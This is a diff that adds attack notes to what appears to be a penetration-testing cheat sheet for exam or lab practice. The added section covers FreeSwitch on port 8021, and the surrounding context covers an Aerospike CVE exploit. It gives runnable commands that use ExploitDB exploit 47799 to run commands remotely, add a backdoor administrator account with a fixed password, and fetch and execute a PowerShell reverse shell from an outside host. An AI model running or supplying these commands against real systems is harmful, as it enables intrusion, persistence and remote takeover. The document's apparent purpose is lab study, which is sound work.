@@ -732,3 +732,21 @@ git clone https://github.com/b4ny4n/CVE-2020-13151.git
 python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
 nc -nlvp 443
 ```
+
+
+### <ins>Port 8021 FreeSwitch</ins>
+[ExploitDB](https://www.exploit-db.com/exploits/47799)
+[One Way](https://nasrallahbaadi.com/posts/THM-Flatline)
+[Another way](https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/flatline)
+
+
+```
+1. https://www.exploit-db.com/exploits/47799
+2. searchsploit -m 47799 
+3. python3 47799.py $ip whoami   
+	1. oscp\chris
+4. python3 47799.py $ip$ 'net user /add viper Password123 && net localgroup "Administrators" /add viper'
+5. python3 -m http.server 80
+6. rlwrap -cAr nc -lvnp 4444
+7. python3 47799.py $ip "powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.45.164/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.164 -Port 4444"
+```
